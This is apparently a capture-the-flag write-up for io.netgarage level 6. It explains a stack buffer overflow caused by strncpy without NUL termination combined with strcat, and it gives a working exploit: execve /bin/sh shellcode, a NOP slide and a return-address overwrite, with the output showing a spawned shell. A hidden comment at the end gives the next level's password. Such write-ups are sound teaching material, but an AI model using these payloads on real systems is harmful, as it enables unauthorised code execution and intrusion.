## Level 6:

Strange *ebp* and *esp* overflow effect.

```c
 1 //written by bla
 2 //inspired by nnp
 3 #include <stdio.h>
 4 #include <stdlib.h>
 5 #include <string.h>
 6 
 7 enum{
 8 LANG_ENGLISH,
 9 LANG_FRANCAIS,
10 LANG_DEUTSCH,
11 };
12 
13 int language = LANG_ENGLISH;
14 
15 struct UserRecord{
16     char name[40];
17     char password[32];
18     int id;
19 };
20 
21 void greetuser(struct UserRecord user){
22     char greeting[64];
23     switch(language){
24         case LANG_ENGLISH:
25             strcpy(greeting, "Hi "); break;
26         case LANG_FRANCAIS:
27             strcpy(greeting, "Bienvenue "); break;
28         case LANG_DEUTSCH:
29             strcpy(greeting, "Willkommen "); break;
30     }
31     strcat(greeting, user.name);
32     printf("%s\n", greeting);
33 }
34 
35 int main(int argc, char **argv, char **env){
36     if(argc != 3) {
37         printf("USAGE: %s [name] [password]\n", argv[0]);
38         return 1;
39     }
40 
41     struct UserRecord user = {0};
42     strncpy(user.name, argv[1], sizeof(user.name));
43     strncpy(user.password, argv[2], sizeof(user.password));
44 
45     char *envlang = getenv("LANG");
46     if(envlang)
47         if(!memcmp(envlang, "fr", 2))
48             language = LANG_FRANCAIS;
49         else if(!memcmp(envlang, "de", 2))
50             language = LANG_DEUTSCH;
51 
52     greetuser(user);
53 }
```

strncpy doesn't protect against a overflow because it doesn't require a NUL termination more [here](https://devblogs.microsoft.com/oldnewthing/20050107-00/?p=36773).

The strncpy is one part of the puzzle. Currently if we try to store name larger or equel to 40 bytes we will save the 40 characters without the NUL byte and the same can be done with the password. This alone causes SIGSEGV but it isn't too helpful.

There is another "unsafe" function: strcat. We are concatinating first the greeting ("Hi ", ...) into the greeting variable and then the name. However since the name doesn't have NUL byte it will actually concatinate the password as well and this will cause an overflow. We are trying to fit 72 bytes (name + password) + greeting into a 64 byte reserved space. We can clearly see this in action if we just try to run the program with the max name and password.

```console

```

Here we can see the buffer is too small, thankfully we can add few more bytes by changing the LANG variable, I chose fr for french.

```console

```

Now we overwrote the return address!



We can also see after the 40 bytes the remaining size is 26 before we overwrite the return address, so we need to add 26random bytes (I chose "B" or \x42) and then append the starting address of the shellcode (in my case: 0xbffffb1a).

So our total payload looks like this:
```console
(gdb) r $(python -c 'print "A"*6 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*11 + " " + "B"*26 + "\x1a\xfb\xff\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level06 $(python -c 'print "A"*6 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*11 + " " + "B"*26 + "\x1a\xfb\xff\xbf"')

Breakpoint 4, 0x08048581 in greetuser ()
(gdb) c
Continuing.
Bienvenue AAAAAA1�Ph//shh/bin��PS��
                                   AAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB����

Breakpoint 5, 0x08048591 in greetuser ()
(gdb) c
Continuing.
process 3917 is executing new program: /bin/bash
sh-4.3$
```

After continuing throught our breakpoints we get the shell. If we however try this outside the gdb we get an error:

I've also added a NOP slide (\x90 bytes) to help if the address was slightly off (this helps me in the future).

```console
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + " " + "B"*26 + "\x1a\xfb\xff\xbf"')
Bienvenue �����������������1�Ph//shh/bin��PS��
                                              BBBBBBBBBBBBBBBBBBBBBBBBBB����
Illegal instruction
level6@io:/levels$ 
```

This is because the address while using the gdb was probably slightly different. There is a way to use the absolut address, for this solution you can go [here](https://github.com/randomcompanyname/ctf_writeup/blob/master/io.netgarage.org/level6.md). 

What I tried is changing the least significant byte by a factor of 16 (i.e. \x00 -> \x10 -> \x20 ...) to find the address. Since I'm using the NOP slide I need just the approximate location to the payload to execute it and it turns out to be 0xbffffb40:

```console
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + " " + "B"*26 + "\x40\xfb\xff\xbf"')
Bienvenue �����������������1�Ph//shh/bin��PS��
                                              BBBBBBBBBBBBBBBBBBBBBBBBBB@���
sh-4.3$ 
```

<!-- Level 7 password ==> U3A6ZtaTub14VmwV -->